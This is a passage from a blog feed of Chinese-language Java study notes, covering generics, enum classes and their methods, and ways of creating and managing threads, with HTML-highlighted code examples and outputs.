</span><br><span class="line">        Notepad&lt;String,Integer&gt; t = <span class="literal">null</span> ;        <span class="comment">// 定义两个泛型类型的对象  </span></span><br><span class="line">        t = <span class="keyword">new</span> <span class="title class_">Notepad</span>&lt;String,Integer&gt;() ;       <span class="comment">// 里面的key为String，value为Integer  </span></span><br><span class="line">        t.setKey(<span class="string">&quot;汤姆&quot;</span>) ;        <span class="comment">// 设置第一个内容  </span></span><br><span class="line">        t.setValue(<span class="number">20</span>) ;            <span class="comment">// 设置第二个内容  </span></span><br><span class="line">        System.out.print(<span class="string">&quot;姓名；&quot;</span> + t.getKey()) ;      <span class="comment">// 取得信息  </span></span><br><span class="line">        System.out.print(<span class="string">&quot;，年龄；&quot;</span> + t.getValue()) ;       <span class="comment">// 取得信息  </span></span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="泛型方法">泛型方法</h4><p>泛型方法的使用并不是简单将类型替换为泛型，以下例子均<strong>不是</strong>泛型方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setKey</span><span class="params">(K key)</span>&#123;  </span><br><span class="line">    <span class="built_in">this</span>.key = key ;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(V value)</span>&#123;  </span><br><span class="line">    <span class="built_in">this</span>.value = value ;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记（10）：枚举类与注解</title>
      <link href="/2022/05/27/Java%E7%AC%94%E8%AE%B0%EF%BC%8810%EF%BC%89%EF%BC%9A%E6%9E%9A%E4%B8%BE%E7%B1%BB/"/>
      <url>/2022/05/27/Java%E7%AC%94%E8%AE%B0%EF%BC%8810%EF%BC%89%EF%BC%9A%E6%9E%9A%E4%B8%BE%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="枚举类">枚举类</h2><p>Java 枚举是一个特殊的类，一般表示一组常量，比如一年的 4 个季节，一个年的 12 个月份，一个星期的 7 天，方向有东南西北等等。</p><h3 id="自定义枚举类">自定义枚举类</h3><h4 id="方式一：通过一般类">方式一：通过一般类</h4><ol><li>声明对象的属性：private final修饰</li><li>私有化类的构造器，并给对象属性初始化</li><li>提供当前枚举类的多个对象：public static final修饰</li><li>可选：获取枚举类的属性 getXXX() 或 toString()</li></ol><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Season</span>&#123;</span><br><span class="line">    <span class="comment">//3.提供当前枚举类的多个对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">SPRING</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>(<span class="string">&quot;Spring&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">SUMMER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>(<span class="string">&quot;Summer&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">AUTUMN</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>(<span class="string">&quot;Autumn&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Season</span> <span class="variable">WINTER</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Season</span>(<span class="string">&quot;Winter&quot;</span>);</span><br><span class="line">    <span class="comment">//1.声明对象的属性</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">    <span class="comment">//2.私有化构造器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Season</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//4.可选</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Season&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="方式二：enum关键字">方式二：enum关键字</h4><p>在jdk5.0以后，枚举类可以使用 enum 关键字来定义，各个常量使用逗号 <strong>,</strong> 来分割。</p><p>枚举跟普通类一样可以用自己的变量、方法和构造函数，构造器只能使用 private 访问修饰符，所以外部无法调用。</p><p>枚举既可以包含具体方法，也可以包含抽象方法。 如果枚举类具有抽象方法，则枚举类的每个实例都必须实现它。</p><p>例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Season</span> <span class="variable">spring</span> <span class="operator">=</span> Season.SPRING;</span><br><span class="line">        System.out.println(spring);</span><br><span class="line">        spring.printSeason();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Season</span> &#123;</span><br><span class="line">    SPRING, SUMMER, FALL, WINTER;</span><br><span class="line">    Season()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Season is created&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printSeason</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Season is &quot;</span> + <span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>out：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Season is created</span><br><span class="line">Season is created</span><br><span class="line">Season is created</span><br><span class="line">Season is created</span><br><span class="line">SPRING</span><br><span class="line">Season is SPRING</span><br></pre></td></tr></table></figure><h3 id="enum类常用方法">Enum类常用方法</h3><p>我们自定义的枚举类默认继承于java.lang.Enum类，例如默认重写了toString()方法，以及提供了很多常用方法。</p><ul><li><p>value()：返回枚举类中所有的值(返回一个数组)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Season[] values = Season.values();</span><br><span class="line"><span class="keyword">for</span> (Season s : values) &#123;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>out：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SPRING</span><br><span class="line">SUMMER</span><br><span class="line">FALL</span><br><span class="line">WINTER</span><br></pre></td></tr></table></figure></li><li><p>valueOf(String str)：返回枚举类中对象名为<code>str</code>的对象，如果没有<code>str</code>为名的枚举类。则抛出错误。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Season</span> <span class="variable">summer</span> <span class="operator">=</span> Season.valueOf(<span class="string">&quot;SUMMER&quot;</span>);</span><br><span class="line">System.out.println(summer);<span class="comment">//out:SUMMER</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="enum关键词枚举类实现接口">enum关键词枚举类实现接口</h3><h4 id="一：枚举类实现接口">一：枚举类实现接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Season</span> <span class="keyword">implements</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">   SPRING, SUoMMER, FALL, WINTER;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="built_in">this</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Info</span>&#123;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二：枚举类对象实现接口">二：枚举类对象实现接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Season</span> <span class="keyword">implements</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">   SPRING&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">   &#125;,</span><br><span class="line">   SUMMER&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">   &#125;, </span><br><span class="line">   FALL&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">   &#125;, </span><br><span class="line">   WINTER&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">   &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记（9）：多线程</title>
      <link href="/2022/05/16/Java%E7%AC%94%E8%AE%B0%EF%BC%889%EF%BC%89%EF%BC%9A%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
      <url>/2022/05/16/Java%E7%AC%94%E8%AE%B0%EF%BC%889%EF%BC%89%EF%BC%9A%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="多线程">多线程</h2><h3 id="多线程的创建">多线程的创建</h3><h4 id="方式一：继承于thread类">方式一：继承于Thread类</h4><ol><li>创建一个继承于Thread类的子类</li><li>重写Thread类的run()方法（将线程执行的操作写在里面）</li><li>创建Thread类子类的对象</li><li>通过此对象调用start()方法（不能通过直接调用run()方法启动线程）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">TestThread</span> <span class="variable">testThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestThread</span>();</span><br><span class="line">testThread.start();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestThread</span> <span class="keyword">extends</span> <span class="title class_">Thread</span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们需要两个线程同时进行的时候，我们不可以再启动一个已经start的线程的对象，需要新建一个对象。</p><p>我们还可以通过创建Thread类的匿名子类实现多线程创建：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Thread</span>()&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;.start();</span><br></pre></td></tr></table></figure><h4 id="方式二：实现runnable接口">方式二：实现Runnable接口</h4><ol><li>创建一个实现了Runnable接口的类</li><li>实现run()方法</li><li>创建实现类的对象</li><li>将此对象作为参数传递到Thread类的构造器中，创建Thread类的对象</li><li>通过Thread类的对象调用start()方法</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">TestThread</span>()).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于实现类的对象与启动线程的对象不相同，因此一个实现类对象可以有多个线程。</p><p>开发中我们一般优先选择方式二实现Runnable接口的方式：</p><ol><li>实现没有类的单继承性的局限性</li><li>实现的方法更适合来处理多个线程有共享数据的情况</li></ol><p>二者之间有所联系：Thread类本身也是实现Runnable接口的</p><h4 id="thread类常用方法">Thread类常用方法</h4><p>void start()：启动线程，并执行run()方法</p><p>run()：线程被调度时执行的操作</p><p>String getName()：返回线程的名字</p><p>void setName()：设置线程名字</p><p>static Thread currentThread()：返回当前线程，相当于this</p><p>yiele()：释放当前线程的cpu执行权</p><p>join()：优先执行该线程，原线程进入阻塞状态，执行完该线程后再继续执行原线程</p><p>stop()：强制结束当前线程生命期（<strong>不推荐使用</strong>）</p><p>sleep(long millisec)：让当前执行的线程休眠指定millisec毫秒（进入阻塞状态）。使用该方法时，会抛出一个异常，由于父类run()方法是没有抛出异常的，因此只能使用try-catch处理异常</p><p>isAlive()：判断线程是否存活</p><h4 id="方式三：实现callable接口">方式三：实现Callable接口</h4><p>这种创建多线程的方式是JDK5.0新增的一种方式。与实现Runnable相比，Callable功能更强大：</p><ul><li>相比run()方法，call()方法可以有返回值</li><li>call()方法可以抛出异常</li><li>支持泛型的返回值</li><li>需要借助FutureTask类</li></ul><p>FutureTask是Future接口的唯一的实现类，它同时实现了Runnable和Future接口。它既可以作为Runnable被线程执行，也可以作为Future得到Callable的返回值。</p><p>使用过程：</p><ol><li>创建一个实现Callable的实现类</li><li>实现Call()方法，类似于run()</li><li>创建Callable实现类的对象</li><li>将Callable实现类的对象传递到FutureTask构造器中</li><li>创建Thread对象，并执行start()方法启动线程</li><li>若需要返回值，则可以使用Callable实现类的对象的get()方法返回值</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">//3.创建Callable实现类的对象</span></span><br><span class="line">      <span class="type">NumThread</span> <span class="variable">numThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NumThread</span>();</span><br><span class="line">      <span class="comment">//4.将Callable实现类的对象传递到FutureTask构造器中</span></span><br><span class="line">      <span class="type">FutureTask</span> <span class="variable">futureTask</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FutureTask</span>(numThread);</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(futureTask).start();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">//get()返回值即为FutureTask构造器参数的Callable实现类重写的call()方法的返回值</span></span><br><span class="line">         <span class="type">Object</span> <span class="variable">sum</span> <span class="operator">=</span> futureTask.get();</span><br><span class="line">         System.out.println(<span class="string">&quot;sum = &quot;</span> + sum);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1.创建一个实现Callable的实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NumThread</span> <span class="keyword">implements</span> <span class="title class_">Callable</span>&#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//2.实现Call()方法</span></span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">            sum += i;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> sum;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="方式四：线程池">方式四：线程池</h4><p>当经常需要创建和销毁、使用量比较大的资源，比如并发情况下的线程，对性能影响较大。这时候我们可以提前创建好多个线程，放入线程池中，使用时直接获取，使用完后放入池中。使用线程池有几点好处：</p><ul><li>提高响应速度</li><li>降低资源消耗</li><li>便于线程管理</li></ul><p>Java标准库提供了ExecutorService接口表示线程池，但ExecutorService只是一个接口，Java标准库提供的几个常用实现类：</p><ul><li>FixedThreadPool：线程数固定的线程池</li><li>CachedThreadPool：线程数根据任务动态调整的线程池</li><li>SingleThreadExecutor：仅单线程执行的线程池</li></ul><p>创建这些线程池的方法都被封装在Executors类中，均为<code>newXXXX</code>。</p><p>线程池多线程使用流程：</p><ol><li>创建线程池</li><li>执行指定的线程的操作，提供一个Runnable接口（execute()方法）或Callable接口（submit()方法）实现类的对象作为参数</li><li>关闭线程池</li></ol><p>例子以FixedThreadPool线程池为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">ExecutorService</span> <span class="variable">service</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line">      service.execute(<span class="keyword">new</span> <span class="title class_">TestThread</span>());</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">if</span>(i % <span class="number">2</span> != <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      service.shutdown();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestThread</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot;:&quot;</span> + i);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>设置线程池属性</strong></p><p>由于ExecutorService作为一个接口，里面不包含具体的方法，我们通过getClass()方法可以获取到service的类是ThreadPoolExecutor，我们前面是使用多态的方式创建的对象，导致ThreadPoolExecutor的方法不能使用，因此我们可以使用强转的方式转换为ThreadPoolExecutor类，再调用设置线程池属性的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ExecutorService</span> <span class="variable">service</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line"><span class="type">ThreadPoolExecutor</span> <span class="variable">service2</span> <span class="operator">=</span> (ThreadPoolExecutor) service;</span><br><span class="line">service2.setCorePoolSize(<span class="number">10</span>);<span class="comment">//设置核心池大小为15</span></span><br></pre></td></tr></table></figure><h3 id="线程的调度">线程的调度</h3><p>Java对于同优先级线程组成先进先出队列（先到先服务），采用“时间片”策略（切换处理），对于高优先级，使用有限调度的抢占式策略（高优先级线程抢占CPU）。</p><p>线程的优先级有三个常量：</p><ul><li>MAX_PRIORITY : 10</li><li>MIN_PRIORITY : 1</li><li>NORM_PRIORITY : 5</li></ul><p>涉及的方法：</p><ul><li>getPriority() : 返回线程优先值</li><li>setPriority(int newPriority) : 改变线程的优先级</li></ul><p>注意点：</p><p>高优先级线程抢占低线程的执行权，但是不意味需要当高优先级执行完以后，低优先级的线程才能执行，只是从概率上讲，高优先级的线程更优先被执行。</p><p>线程创建时会自动继承父线程的优先级。</p><h3 id="线程的生命周期">线程的生命周期</h3><p>线程的启动到线程的结束的整个过程被称之为线程的生命周期。</p><p>线程的生命周期中存在多种状态：</p><ol><li>新建：当一个Thread类及其子类被声明并创建时，新生的线程处于就绪状态</li><li>就绪：当新建状态的线程被start()后，将进入线程队列等待CPU时间片，此时它已经具备了运行的条件，但暂时没有分配到CPU资源</li><li>运行：当就绪的线程被调度并获得CPU资源时，便进入运行状态</li><li>阻塞：在某些情况下，被人为挂起或者执行输入输出操作时，临时中止自己的执行，进入阻塞状态</li><li>死亡：线程完成了全部工作，或者线程被强制提前终止，或出现异常导致结束</li></ol><p><img src="https://image.icewindy.cn/202205201717258.png" alt="image-20220520171701160"></p><h3 